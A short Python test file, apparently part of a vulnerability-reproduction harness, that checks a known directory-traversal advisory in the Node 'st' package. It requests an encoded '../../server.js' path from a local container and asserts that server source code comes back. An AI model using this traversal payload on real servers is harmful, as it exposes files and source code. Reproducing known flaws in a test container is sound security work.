from data.exploits.base.BasicExploit import BasicExploit
from settings import mapped_port_host

class Exploit(BasicExploit):

	attributes = {
		  "Name" : "STTest",
		  "Description" : "Test suite for the ST application",
		  "Target" : "st",
		  "Container" : "ubuntu-node",
		  "Type" : "N/A"
		#https://nodesecurity.io/advisories/st_directory_traversal
	}

	def runExploit(self):
		w = self.wrapper
		w.navigate("http://localhost:%s/%2e%2e/%2e%2e/server.js" % mapped_port_host)
		self.assertIn("createServer", w.page_source())
